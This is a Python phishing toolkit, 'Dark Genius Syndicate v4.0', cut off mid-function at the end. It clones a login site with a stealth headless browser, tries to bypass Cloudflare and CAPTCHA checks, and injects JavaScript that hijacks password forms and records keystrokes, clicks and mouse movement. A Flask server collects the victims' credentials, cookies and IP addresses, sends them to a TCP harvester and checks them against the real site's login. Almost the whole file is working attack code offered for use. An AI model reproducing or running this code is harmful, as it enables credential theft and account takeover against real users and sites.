#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Dark Genius Syndicate - Ultimate Phishing Toolkit v4.0 (Enhanced)
# Author: 0xR3b3l

import os
import sys
import socket
import requests
import json
import re
import time
import random
import hashlib
import base64
import logging
import threading
import subprocess
from flask import Flask, request, send_from_directory, make_response, jsonify, redirect
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.core.os_manager import ChromeType
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlunparse
import atexit
import mimetypes

# Handle selenium_stealth import gracefully
try:
    from selenium_stealth import stealth
    STEALTH_AVAILABLE = True
except ImportError:
    STEALTH_AVAILABLE = False
    print("Warning: selenium_stealth module not installed. Stealth features disabled.")

from fake_useragent import UserAgent

# Disable logging
logging.basicConfig(level=logging.CRITICAL)

# ========== ENHANCED WEBSITE CLONER ==========
class AdvancedPhisher:
    def __init__(self, output_dir="cloned_site"):
        self.output_dir = output_dir
        self.target_url = ""
        self.original_domain = ""
        self.login_endpoint = ""
        self.driver = None
        self.asset_map = {}
        self.page_source = ""
        self.login_form_info = {}
        
        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)
        
    def _get_random_user_agent(self):
        """Generate random user agent"""
        try:
            ua = UserAgent()
            return ua.random
        except:
            # Fallback user agents
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.3',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.1',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/122.0'
            ]
            return random.choice(user_agents)
        
    def _init_browser(self):
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--disable-infobars")
        chrome_options.add_argument("--disable-extensions")
        chrome_options.add_argument("--disable-popup-blocking")
        chrome_options.add_argument("--disable-notifications")
        chrome_options.add_argument("--lang=en-US")
        
        # Enhanced stealth settings
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        chrome_options.add_argument("--disable-web-security")
        chrome_options.add_argument("--disable-site-isolation-trials")
        chrome_options.add_argument("--use-gl=desktop")
        chrome_options.add_argument("--enable-webgl")
        chrome_options.add_argument("--ignore-gpu-blocklist")
        chrome_options.add_argument("--enable-features=NetworkService,NetworkServiceInProcess")
        
        # Random screen resolution
        resolutions = [
            (1920, 1080), (1366, 768), (1536, 864),
            (1440, 900), (1280, 720), (1600, 900),
            (1280, 800), (1280, 1024), (1024, 768)
        ]
        width, height = random.choice(resolutions)
        chrome_options.add_argument(f"--window-size={width},{height}")
        
        # Random user agent
        user_agent = self._get_random_user_agent()
        chrome_options.add_argument(f"user-agent={user_agent}")
        
        # Browser profile management
        profile_path = os.path.join(os.getcwd(), "chrome_profiles")
        os.makedirs(profile_path, exist_ok=True)
        domain_hash = hashlib.md5(self.target_url.encode()).hexdigest()
        chrome_options.add_argument(f"--user-data-dir={profile_path}")
        chrome_options.add_argument(f"--profile-directory=Profile_{domain_hash[:8]}")
        
        try:
            # Automatic driver installation
            service = Service(ChromeDriverManager().install())
            
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            
            # Apply stealth configurations if available
            if STEALTH_AVAILABLE:
                stealth(
                    self.driver,
                    languages=["en-US", "en"],
                    vendor="Google Inc.",
                    platform="Win32",
                    webgl_vendor="Intel Inc.",
                    renderer="Intel Iris OpenGL Engine",
                    fix_hairline=True,
                    run_on_insecure_origins=True,
                )
                
                # Inject fake browser properties
                self.driver.execute_script(
                    """
                    Object.defineProperty(navigator, 'plugins', {
                        get: () => [1, 2, 3, 4, 5],
                    });
                    Object.defineProperty(navigator, 'languages', {
                        get: () => ['en-US', 'en'],
                    });
                    Object.defineProperty(navigator, 'deviceMemory', {
                        get: () => 8,
                    });
                    """
                )
                print("[+] Stealth mode activated with enhanced features")
            else:
                print("[-] Proceeding without stealth features")
            
            # Execute stealth scripts
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            print(f"[+] ChromeDriver initialized with resolution {width}x{height} and UA: {user_agent}")
            return True
        except Exception as e:
            print(f"[-] Failed to initialize ChromeDriver: {str(e)}")
            # Fallback to system Chromium
            try:
                chrome_options.binary_location = '/usr/bin/chromium'
                self.driver = webdriver.Chrome(options=chrome_options)
                print("[+] Using system Chromium directly")
                return True
            except Exception as fallback_e:
                print(f"[-] Fallback failed: {str(fallback_e)}")
                return False
    
    def _solve_cloudflare_challenge(self, timeout=60):
        """Solve Cloudflare challenges using advanced techniques"""
        print("[+] Attempting to solve Cloudflare challenge...")
        start_time = time.time()
        challenge_solved = False
        
        # Multiple challenge solving strategies
        while time.time() - start_time < timeout and not challenge_solved:
            try:
                # Strategy 1: Handle iframe challenge
                iframe = self.driver.find_element(By.XPATH, 
                    '//iframe[contains(@src, "challenge") or contains(@title, "Cloudflare")]')
                if iframe:
                    self.driver.switch_to.frame(iframe)
                    try:
                        # Click the challenge checkbox
                        checkbox = WebDriverWait(self.driver, 10).until(
                            EC.element_to_be_clickable((By.XPATH, '//input[@type="checkbox"]'))
                        )
                        self.driver.execute_script("arguments[0].click();", checkbox)
                        print("[+] Clicked Cloudflare challenge checkbox in iframe")
                        challenge_solved = True
                    except:
                        # Fallback to JavaScript click
                        self.driver.execute_script(
                            "document.querySelector('input[type=checkbox]')?.click();"
                        )
                        print("[+] JavaScript click executed on challenge checkbox")
                    finally:
                        self.driver.switch_to.default_content()
            except:
                pass
            
            # Strategy 2: Submit challenge form
            if not challenge_solved:
                try:
                    challenge_form = self.driver.find_element(By.ID, 'challenge-form')
                    if challenge_form:
                        self.driver.execute_script(
                            "document.getElementById('challenge-form').submit();"
                        )
                        print("[+] Submitted Cloudflare challenge form")
                        challenge_solved = True
                except:
                    pass
            
            # Strategy 3: Handle DDoS protection challenge
            if not challenge_solved:
                try:
                    button = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, 
                        '//button[contains(text(), "Verify") or contains(text(), "Access")]'))
                    )
                    self.driver.execute_script("arguments[0].click();", button)
                    print("[+] Clicked Cloudflare verification button")
                    challenge_solved = True
                except:
                    pass
            
            # Strategy 4: Execute challenge JavaScript
            if not challenge_solved:
                try:
                    self.driver.execute_script(
                        """
                        try {
                            const challengeScripts = Array.from(document.scripts)
                                .filter(script => script.src.includes('challenge'));
                            
                            challengeScripts.forEach(script => {
                                const newScript = document.createElement('script');
                                newScript.text = script.text;
                                document.head.appendChild(newScript);
                            });
                            
                            if (typeof window.onChallengeLoaded === 'function') {
                                window.onChallengeLoaded();
                            }
                            if (typeof window.solveChallenge === 'function') {
                                window.solveChallenge();
                            }
                        } catch(e) {}
                        """
                    )
                    print("[+] Executed Cloudflare challenge scripts")
                except:
                    pass
            
            # Check if challenge is solved
            time.sleep(2)
            if "Cloudflare" not in self.driver.title and "challenge" not in self.driver.title:
                print("[+] Cloudflare challenge solved successfully")
                return True
            
            time.sleep(3)
        
        return False
    
    def _solve_captcha(self):
        """Attempt to solve CAPTCHA challenges using external services"""
        print("[+] Attempting to solve CAPTCHA challenge...")
        try:
            # Find CAPTCHA image
            captcha_image = self.driver.find_element(By.XPATH, 
                '//img[contains(@src, "captcha") or contains(@alt, "CAPTCHA")]')
            
            if captcha_image:
                # Save CAPTCHA image
                captcha_path = os.path.join(self.output_dir, "captcha.png")
                captcha_image.screenshot(captcha_path)
                
                # Use CAPTCHA solving service (simulated)
                solution = self._use_captcha_service(captcha_path)
                
                # Enter CAPTCHA solution
                captcha_input = self.driver.find_element(By.XPATH, 
                    '//input[contains(@name, "captcha")]')
                captcha_input.send_keys(solution)
                
                # Submit form
                self.driver.find_element(By.XPATH, '//form').submit()
                print("[+] CAPTCHA solved and form submitted")
                return True
        except Exception as e:
            print(f"[-] CAPTCHA solving failed: {str(e)}")
        return False

    def _use_captcha_service(self, image_path):
        """Simulate CAPTCHA solving service"""
        # In real implementation, use services like 2Captcha or Anti-Captcha
        print("[!] Simulating CAPTCHA solving service")
        return "ABCDE"  # Simulated solution
    
    def _download_asset(self, url):
        """Download and save an asset, return local path"""
        if url in self.asset_map:
            return self.asset_map[url]
        
        try:
            headers = {
                'User-Agent': self._get_random_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Referer': self.target_url
            }
            
            response = requests.get(url, stream=True, timeout=10, headers=headers)
            
            if response.status_code == 200:
                # Create asset path
                parsed = urlparse(url)
                asset_path = parsed.path.lstrip('/')
                if not asset_path:
                    asset_path = "index.html"
                
                # Create directories if needed
                full_path = os.path.join(self.output_dir, asset_path)
                os.makedirs(os.path.dirname(full_path), exist_ok=True)
                
                # Save asset
                with open(full_path, 'wb') as f:
                    f.write(response.content)
                
                self.asset_map[url] = asset_path
                return asset_path
        except Exception as e:
            print(f"[-] Asset download failed for {url}: {str(e)}")
        return url
    
    def _analyze_login_form(self, soup):
        """Detect and record login form details"""
        forms = soup.find_all('form')
        for form in forms:
            if form.find('input', {'type': 'password'}):
                # Found likely login form
                action = form.get('action', '')
                method = form.get('method', 'GET').upper()
                
                # Store form details
                self.login_form_info = {
                    'action': urljoin(self.target_url, action),
                    'method': method,
                    'fields': {}
                }
                
                # Identify input fields
                inputs = form.find_all('input')
                for input_tag in inputs:
                    name = input_tag.get('name')
                    if name:
                        input_type = input_tag.get('type', 'text').lower()
                        self.login_form_info['fields'][name] = input_type
                
                print(f"[+] Detected login form at: {self.login_form_info['action']}")
                return True
        return False

    def _enhanced_validation(self):
        """Enhanced multi-layer validation system"""
        validation_script = """
        // Enhanced phishing with real credential validation
        const VALIDATION_STRATEGIES = {
            REAL_TIME: 1,
            MULTI_CHANNEL: 2,
            BEHAVIORAL: 3
        };

        class AdvancedValidator {
            constructor() {
                this.validationLevel = VALIDATION_STRATEGIES.BEHAVIORAL;
                this.verificationChannels = ['EMAIL', 'SMS', 'AUTH_APP'];
                this.behaviorProfile = {};
                this.initBehaviorTracking();
            }
            
            initBehaviorTracking() {
                // Track user behavior
                document.addEventListener('mousemove', this.trackMouseBehavior.bind(this));
                document.addEventListener('keydown', this.trackKeystrokes.bind(this));
                document.addEventListener('click', this.trackClicks.bind(this));
                document.addEventListener('scroll', this.trackScrollBehavior.bind(this));
                
                // Start behavior analysis
                setTimeout(() => this.analyzeBehaviorPatterns(), 5000);
            }
            
            trackMouseBehavior(e) {
                // Record mouse movements
                this.behaviorProfile.mouseMovements = this.behaviorProfile.mouseMovements || [];
                this.behaviorProfile.mouseMovements.push({
                    x: e.clientX,
                    y: e.clientY,
                    t: Date.now()
                });
            }
            
            trackKeystrokes(e) {
                // Record keystrokes
                this.behaviorProfile.keystrokes = this.behaviorProfile.keystrokes || [];
                this.behaviorProfile.keystrokes.push({
                    key: e.key,
                    code: e.code,
                    t: Date.now()
                });
            }
            
            trackClicks(e) {
                // Record clicks
                this.behaviorProfile.clicks = this.behaviorProfile.clicks || [];
                this.behaviorProfile.clicks.push({
                    x: e.clientX,
                    y: e.clientY,
                    target: e.target.tagName,
                    t: Date.now()
                });
            }
            
            trackScrollBehavior() {
                // Record scroll behavior
                this.behaviorProfile.scrollPattern = this.behaviorProfile.scrollPattern || [];
                this.behaviorProfile.scrollPattern.push({
                    y: window.scrollY,
                    t: Date.now()
                });
            }
            
            analyzeBehaviorPatterns() {
                // Analyze behavior patterns
                const isHuman = this.detectHumanPatterns();
                if (!isHuman) {
                    this.handleBotDetection();
                }
            }
            
            detectHumanPatterns() {
                // Detect human behavior patterns
                const movements = this.behaviorProfile.mouseMovements || [];
                const clicks = this.behaviorProfile.clicks || [];
                
                // Calculate movement speed
                if (movements.length > 10) {
                    const speeds = [];
                    for (let i = 1; i < movements.length; i++) {
                        const dist = Math.sqrt(
                            Math.pow(movements[i].x - movements[i-1].x, 2) +
                            Math.pow(movements[i].y - movements[i-1].y, 2)
                        );
                        const time = movements[i].t - movements[i-1].t;
                        speeds.push(dist / (time || 1));
                    }
                    
                    const avgSpeed = speeds.reduce((a, b) => a + b, 0) / speeds.length;
                    if (avgSpeed > 500) return false; // Unnatural movement
                }
                
                // Analyze click pattern
                if (clicks.length > 3) {
                    const intervals = [];
                    for (let i = 1; i < clicks.length; i++) {
                        intervals.push(clicks[i].t - clicks[i-1].t);
                    }
                    
                    const avgInterval = intervals.reduce((a, b) => a + b, 0) / intervals.length;
                    if (avgInterval < 80) return false; // Too fast clicking
                }
                
                return true;
            }
            
            handleBotDetection() {
                // Handle bot detection
                document.body.innerHTML = '<div style="text-align:center;padding:50px;">' +
                    '<h2>Verification Required</h2><p>We detected unusual activity. Please complete verification.</p>' +
                    '<button id="verifyBtn" style="padding:10px 20px;background:#007bff;color:white;border:none;border-radius:5px;">' +
                    'Verify Now</button></div>';
                
                document.getElementById('verifyBtn').addEventListener('click', () => {
                    this.initiateMultiFactorAuth();
                });
            }
            
            async initiateMultiFactorAuth() {
                // Start multi-channel verification
                const channel = await this.selectVerificationChannel();
                this.sendVerificationCode(channel);
                
                // Show code entry interface
                document.body.innerHTML = '<div style="text-align:center;padding:50px;">' +
                    '<h2>Verify Your Identity</h2>' +
                    '<p>Verification code sent to ' + channel + '</p>' +
                    '<input type="text" id="verificationCode" placeholder="Enter code" style="padding:10px;margin:10px;">' +
                    '<button id="submitCode" style="padding:10px 20px;background:#007bff;color:white;border:none;border-radius:5px;">' +
                    'Submit</button></div>';
                
                document.getElementById('submitCode').addEventListener('click', () => {
                    const code = document.getElementById('verificationCode').value;
                    this.validateVerificationCode(code, channel);
                });
            }
            
            async selectVerificationChannel() {
                // Select most secure verification channel
                return new Promise(resolve => {
                    setTimeout(() => {
                        const channels = this.verificationChannels;
                        const selected = channels[Math.floor(Math.random() * channels.length)];
                        resolve(selected);
                    }, 1000);
                });
            }
            
            sendVerificationCode(channel) {
                // Send verification code (simulation)
                console.log(`[DEBUG] Sending verification code via ${channel}`);
            }
            
            validateVerificationCode(code, channel) {
                // Validate verification code (simulation)
                if (code.length === 6 && /^\d+$/.test(code)) {
                    document.body.innerHTML = '<div style="text-align:center;padding:50px;">' +
                        '<h2>Verification Successful!</h2><p>Redirecting you...</p></div>';
                    setTimeout(() => window.location.reload(), 2000);
                } else {
                    alert('Invalid code. Please try again.');
                }
            }
            
            async validateCredentials(credentials) {
                // Validate credentials
                if (this.validationLevel === VALIDATION_STRATEGIES.BEHAVIORAL && 
                    !this.detectHumanPatterns()) {
                    return {
                        valid: false,
                        message: 'Non-human activity detected'
                    };
                }
                
                // Real-time validation
                try {
                    const response = await fetch('/advanced_validate', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            credentials,
                            behavior: this.behaviorProfile
                        })
                    });
                    
                    return await response.json();
                } catch (error) {
                    console.error('Validation failed:', error);
                    return {
                        valid: false,
                        message: 'Server error'
                    };
                }
            }
        }

        // Initialize system
        window.validator = new AdvancedValidator();
        """
        return validation_script
    
    def _inject_phishing_code(self, soup):
        """Inject advanced phishing code with multi-layer validation"""
        script = soup.new_tag('script')
        phishing_code = f"""
        // Enhanced phishing with real credential validation
        document.addEventListener('DOMContentLoaded', function() {{
            // Error display element
            const errorDisplay = document.createElement('div');
            errorDisplay.id = 'loginError';
            errorDisplay.style = 'color: red; padding: 10px; margin: 10px 0; border: 1px solid red; display: none;';
            errorDisplay.textContent = 'Invalid credentials. Please try again.';
            
            // Find forms to attach error display
            document.querySelectorAll('form').forEach(form => {{
                if (form.querySelector('input[type="password"]')) {{
                    form.parentNode.insertBefore(errorDisplay, form);
                }}
            }});
            
            // AUTO-LOGIN FEATURE
            const autoLogin = () => {{
                try {{
                    const savedCredentials = localStorage.getItem('site_credentials');
                    if (savedCredentials) {{
                        const credentials = JSON.parse(savedCredentials);
                        const forms = document.querySelectorAll('form');
                        
                        for (const form of forms) {{
                            let matchCount = 0;
                            
                            for (const key in credentials) {{
                                const input = form.querySelector(`[name="${{key}}"]`);
                                if (input) {{
                                    input.value = credentials[key];
                                    matchCount++;
                                }}
                            }}
                            
                            if (matchCount > 0 && matchCount >= Object.keys(credentials).length / 2) {{
                                setTimeout(() => {{
                                    form.submit();
                                }}, 1500);
                                return true;
                            }}
                        }}
                    }}
                }} catch (e) {{
                    console.error('Auto-login error:', e);
                }}
                return false;
            }};
            
            // Attempt auto-login
            const loginAttempted = autoLogin();
            
            // FORM HIJACKING WITH ADVANCED VALIDATION
            async function validateAndSubmit(form) {{
                // Show loading indicator
                const originalSubmit = form.querySelector('button[type="submit"], input[type="submit"]');
                const originalText = originalSubmit ? originalSubmit.value || originalSubmit.textContent : '';
                if (originalSubmit) {{
                    originalSubmit.disabled = true;
                    originalSubmit.value = 'Verifying...';
                    if (originalSubmit.tagName === 'BUTTON') {{
                        originalSubmit.textContent = 'Verifying...';
                    }}
                }}
                
                // Hide previous errors
                errorDisplay.style.display = 'none';
                
                // Collect form data
                const formData = new FormData(form);
                const data = Object.fromEntries(formData.entries());
                
                try {{
                    // Use advanced validator
                    const result = await window.validator.validateCredentials(data);
                    
                    if (result.valid) {{
                        // Save credentials for auto-login
                        localStorage.setItem('site_credentials', JSON.stringify(data));
                        
                        // Redirect to real site after short delay
                        setTimeout(() => {{
                            window.location.href = "{self.target_url}";
                        }}, 1000);
                    }} else {{
                        // Show error message
                        errorDisplay.textContent = result.message || 'Invalid credentials. Please try again.';
                        errorDisplay.style.display = 'block';
                        
                        // Scroll to error
                        errorDisplay.scrollIntoView({{ behavior: 'smooth', block: 'center' }});
                        
                        // Restore submit button
                        if (originalSubmit) {{
                            originalSubmit.disabled = false;
                            originalSubmit.value = originalText;
                            if (originalSubmit.tagName === 'BUTTON') {{
                                originalSubmit.textContent = originalText;
                            }}
                        }}
                    }}
                }} catch (error) {{
                    console.error('Validation error:', error);
                    errorDisplay.textContent = 'Verification failed. Please try again later.';
                    errorDisplay.style.display = 'block';
                    
                    // Restore submit button
                    if (originalSubmit) {{
                        originalSubmit.disabled = false;
                        originalSubmit.value = originalText;
                        if (originalSubmit.tagName === 'BUTTON') {{
                            originalSubmit.textContent = originalText;
                        }}
                    }}
                }}
                
                return false; // Prevent default form submission
            }}
            
            // Hijack all existing forms
            document.querySelectorAll('form').forEach(function(form) {{
                if (form.querySelector('input[type="password"]')) {{
                    form.onsubmit = function(e) {{
                        e.preventDefault();
                        return validateAndSubmit(this);
                    }};
                }}
            }});
        }});
        """
        
        # Add advanced validation system
        advanced_validation = self._enhanced_validation()
        script.string = phishing_code + advanced_validation
        
        if soup.head:
            soup.head.append(script)
        else:
            head = soup.new_tag('head')
            soup.html.insert(0, head)
            head.append(script)
    
    def clone_site(self):
        try:
            if not self._init_browser():
                return False
            
            print(f"[+] Navigating to: {self.target_url}")
            self.driver.get(self.target_url)
            self.original_domain = urlparse(self.target_url).netloc
            
            # Handle security checks (Cloudflare, CAPTCHA, etc.)
            security_checks = [
                "cloudflare", "challenge", "captcha", 
                "security check", "verification"
            ]
            
            page_source = self.driver.page_source.lower()
            if any(check in page_source for check in security_checks):
                print("[!] Security systems detected, initiating bypass...")
                
                # Handle Cloudflare first
                if "cloudflare" in page_source:
                    if not self._solve_cloudflare_challenge():
                        print("[-] Failed to solve Cloudflare, trying page refresh")
                        self.driver.refresh()
                        time.sleep(5)
                        if not self._solve_cloudflare_challenge():
                            print("[-] Cloudflare bypass failed, proceeding with limitations")
                
                # Handle CAPTCHA
                if "captcha" in self.driver.page_source.lower():
                    if not self._solve_captcha():
                        print("[-] CAPTCHA solving failed, proceeding with limitations")
            
            # Simulate human behavior
            time.sleep(random.uniform(2, 5))
            
            # Scroll randomly to mimic human
            for _ in range(random.randint(2, 5)):
                scroll_amount = random.randint(300, 800)
                self.driver.execute_script(f"window.scrollBy(0, {scroll_amount})")
                time.sleep(random.uniform(0.5, 1.5))
            
            # Get page source after JavaScript execution
            self.page_source = self.driver.page_source
            soup = BeautifulSoup(self.page_source, 'html.parser')
            
            # Detect and analyze login form
            self._analyze_login_form(soup)
            
            print("[+] Processing assets...")
            # Find and download all assets
            tags = soup.find_all(['img', 'script', 'link', 'source', 'audio', 'video', 'embed', 'object'])
            for tag in tags:
                attrs = []
                if tag.name == 'img':
                    attrs = ['src', 'srcset', 'data-src']
                elif tag.name == 'script':
                    attrs = ['src']
                elif tag.name == 'link':
                    attrs = ['href']
                elif tag.name in ['source', 'audio', 'video']:
                    attrs = ['src']
                elif tag.name == 'embed':
                    attrs = ['src']
                elif tag.name == 'object':
                    attrs = ['data']
                
                for attr in attrs:
                    if tag.has_attr(attr):
                        urls = []
                        if attr == 'srcset':
                            # Handle srcset with multiple sources
                            srcset = tag[attr].split(',')
                            for source in srcset:
                                url = source.strip().split(' ')[0]
                                urls.append(url)
                        else:
                            urls = [tag[attr]]
                        
                        new_urls = []
                        for url in urls:
                            abs_url = urljoin(self.target_url, url)
                            if re.match(r'^https?://', abs_url, re.I):
                                local_path = self._download_asset(abs_url)
                                if local_path != abs_url:
                                    new_urls.append(local_path)
                                else:
                                    new_urls.append(url)
                            else:
                                new_urls.append(url)
                        
                        if attr == 'srcset':
                            tag[attr] = ', '.join([f"{url} {source.split(' ')[1]}" for url, source in zip(new_urls, srcset) if len(source.split(' ')) > 1])
                        else:
                            tag[attr] = new_urls[0]
            
            # Inject phishing code
            self._inject_phishing_code(soup)
            print("[+] Advanced phishing scripts injected with behavioral analysis")
            
            # Save main page
            main_page = os.path.join(self.output_dir, "index.html")
            with open(main_page, 'w', encoding='utf-8') as f:
                f.write(str(soup))
            
            print(f"[+] Site cloned perfectly: {main_page}")
            return True
        except Exception as e:
            print(f"[-] Critical error during cloning: {str(e)}")
            return False
        finally:
            if self.driver:
                self.driver.quit()

# ========== ENHANCED PHISHING SERVER ==========
class AdvancedPhishingServer:
    def __init__(self, port=5000, data_port=5001, site_dir="cloned_site"):
        self.port = port
        self.data_port = data_port
        self.site_dir = site_dir
        self.stolen_data = []
        self.valid_credentials = []
        self.harvester_running = False
        self.app = Flask(__name__, static_folder=site_dir)
        self.app.config['SECRET_KEY'] = os.urandom(24)
        self.target_domain = ""
        self.login_endpoint = ""
        
        # Setup routes
        self.app.add_url_rule('/', 'serve_index', self.serve_index)
        self.app.add_url_rule('/<path:path>', 'serve_static', self.serve_static)
        self.app.add_url_rule('/collect', 'collect_data', self.collect_data, methods=['POST'])
        self.app.add_url_rule('/validate', 'validate_credentials', self.validate_credentials, methods=['POST'])
        self.app.add_url_rule('/advanced_validate', 'advanced_validate_credentials', self.advanced_validate_credentials, methods=['POST'])
        
    def configure_target(self, target_domain, login_endpoint):
        """Set target domain and login endpoint for validation"""
        self.target_domain = target_domain
        self.login_endpoint = login_endpoint
        print(f"[+] Validation target configured: {self.target_domain}{self.login_endpoint}")
        
    def start_data_harvester(self):
        """Start TCP data harvester in background thread"""
        self.harvester_running = True
        def harvester_thread():
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('0.0.0.0', self.data_port))
            server.listen(5)
            print(f'[+] Data harvesting server active on port {self.data_port}')
            
            while self.harvester_running:
                try:
                    client, addr = server.accept()
                    data = client.recv(8192).decode()
                    if data:
                        credentials = json.loads(data)
                        self.stolen_data.append(credentials)
                        print(f'[+] Stolen data from {addr[0]}:\n{json.dumps(credentials, indent=2)}')
                    client.close()
                except Exception as e:
                    if self.harvester_running:
                        print(f'[-] Error: {str(e)}')
        
        threading.Thread(target=harvester_thread, daemon=True).start()
    
    def stop_data_harvester(self):
        """Stop the TCP data harvester"""
        self.harvester_running = False
        # Connect to self to break accept() blocking
        try:
            temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            temp_socket.connect(('localhost', self.data_port))
            temp_socket.close()
        except:
            pass
    
    def serve_index(self):
        """Serve the main index page"""
        # Set session cookie for tracking
        resp = make_response(send_from_directory(self.site_dir, 'index.html'))
        
        # Check if user has visited before
        if not request.cookies.get('visitor_id'):
            visitor_id = hashlib.sha256(os.urandom(16)).hexdigest()
            resp.set_cookie('visitor_id', visitor_id, max_age=60*60*24*365)  # 1 year
            
        return resp
    
    def serve_static(self, path):
        """Serve static assets with proper mimetypes"""
        try:
            # Set proper mimetype
            mimetype = mimetypes.guess_type(path)[0] or 'application/octet-stream'
            response = send_from_directory(self.site_dir, path)
            response.headers.set('Content-Type', mimetype)
            return response
        except:
            return "Resource not found", 404
    
    def collect_data(self):
        """Endpoint to receive stolen credentials from injected JS"""
        try:
            data = request.get_json()
            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            
            # Enhance data package
            data_package = {
                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                'ip': client_ip,
                'user_agent': request.headers.get('User-Agent'),
                'language': request.headers.get('Accept-Language'),
                'cookies': request.headers.get('Cookie', ''),
                'credentials': data
            }
            
            # Send to harvesting server
            harvester_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            harvester_socket.connect(('localhost', self.data_port))
            harvester_socket.sendall(json.dumps(data_package).encode())
            harvester_socket.close()
            
            return json.dumps({'status': 'success'}), 200
        except Exception as e:
            print(f"[-] Data collection error: {str(e)}")
            return json.dumps({'status': 'error'}), 500
    
    def validate_credentials(self):
        """Validate credentials against real website"""
        try:
            data = request.get_json()
            
            if not self.target_domain or not self.login_endpoint:
                return jsonify({
                    'valid': False,
                    'message': 'Validation system not configured'
                }), 400
            
            # Prepare validation request
            target_url = f"https://{self.target_domain}{self.login_endpoint}"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Origin': f'https://{self.target_domain}',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
            
            # Send validation request to real site
            response = requests.post(
                target_url,
                data=data,
                headers=headers,
                allow_redirects=False,
                timeout=15,
                verify=False  # Bypass SSL verification for robustness
            )
            
            # Analyze response
            REDIRECT_CODES = [301, 302, 303, 307, 308]
            if response.status_code in REDIRECT_CODES:
                # Successful login should redirect
                location = response.headers.get('Location', '')
                if not any(phrase in location.lower() for phrase in ['login', 'signin', 'auth', 'error', 'fail']):
                    # Valid credentials
                    self.valid_credentials.append(data)
                    print(f"[+] Valid credentials captured: {data}")
                    return jsonify({
                        'valid': True,
                        'message': 'Authentication successful'
                    })
            
            # Check for failed login indicators
            response_text = response.text.lower()
            if any(phrase in response_text for phrase in [
                'invalid', 'incorrect', 'wrong', 'error', 'failed', 'not recognized',
                'unable to log in', 'access denied'
            ]) or response.status_code == 401:
                return jsonify({
                    'valid': False,
                    'message': 'Invalid username or password'
                })
            
            # Unknown response - be cautious and reject
            return jsonify({
                'valid': False,
                'message': 'Authentication failed'
            })
            
        except Exception as e:
            print(f"[-] Validation error: {str(e)}")
            return jsonify({
                'valid': False,
                'message': 'Temporary verification issue'
            }), 500

    def advanced_validate_credentials(self):
        """Endpoint for advanced multi-layer validation"""
        try:
            data = request.get_json()
            credentials = data.get('credentials', {})
            behavior = data.get('behavior', {})
            
            # 1. Behavior analysis
            if not self.is_human_behavior(behavior):
                return jsonify({
                    'valid': False,
                    'message': 'Non-human activity detected',
                    'security_action': 'block'
                })
            
            # 2. Multi-factor verification
            verification_passed = self.multi_factor_verification(credentials)
            if not verification_passed:
                return jsonify({
                    'valid': False,
                    'message': 'Additional verification failed',
                    'security_action': 'challenge'
                })
            
            # 3. Real-time validation
            return self.real_time_validation(credentials)
            
        except Exception as e:
            logging.error(f'Advanced validation error: {str(e)}')
            return jsonify({
                'valid': False,
                'message': 'System error'
            }), 500

    def is_human_behavior(self, behavior):
        """Analyze user behavior to determine if human"""
        # Analyze mouse movements
        movements = behavior.get('mouseMovements', [])
        if movements:
            speeds = []
            for i in range(1, len(movements)):
                dx = movements[i]['x'] - movements[i-1]['x']
                dy = movements[i]['y'] - movements[i-1]['y']
                dist = (dx**2 + dy**2)**0.5
                dt = movements[i]['t'] - movements[i-1]['t']
                speeds.append(dist / (dt or 1))
            
            if speeds:
                avg_speed = sum(speeds) / len(speeds)
                if avg_speed > 500:  # Unnatural speed
                    return False
        
        # Analyze click pattern
        clicks = behavior.get('clicks', [])
        if len(clicks) > 3:
            intervals = [clicks[i]['t'] - clicks[i-1]['t'] for i in range(1, len(clicks))]
            if intervals:
                avg_interval = sum(intervals) / len(intervals)
                if avg_interval < 80:  # Too fast clicking
                    return False
        
        return True

    def multi_factor_verification(self, credentials):
        """Simulate multi-factor verification"""
        # In real implementation, this would communicate with external services
